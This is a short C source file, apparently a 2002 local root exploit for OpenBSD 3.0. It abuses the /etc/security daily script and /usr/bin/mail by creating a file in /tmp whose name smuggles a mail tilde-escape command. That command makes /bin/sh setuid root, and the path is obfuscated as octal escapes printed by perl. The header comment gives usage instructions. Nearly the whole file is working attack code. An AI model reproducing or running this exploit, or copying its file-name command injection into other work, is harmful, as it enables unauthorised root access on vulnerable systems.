/*
 * (c) 2002 venglin@freebsd.lublin.pl
 *
 * OpenBSD 3.0 (before 08 Apr 2002)
 * /etc/security + /usr/bin/mail local root exploit
 *
 * Run the exploit and wait for /etc/daily executed from crontab.
 * /bin/sh will be suid root next day morning.
 *
 * Credit goes to urbanek@openbsd.cz for discovering vulnerability.
 *
 */

#include <fcntl.h>

int main(void)
{
        int fd;

        chdir("/tmp");
        fd = open("\n~!chmod +s `perl -e 'print \"\\057\\142\\151\\156\\057\\163\\150\"'`\n", O_CREAT|O_WRONLY, 04777);

        if (fd)
                close(fd);
}
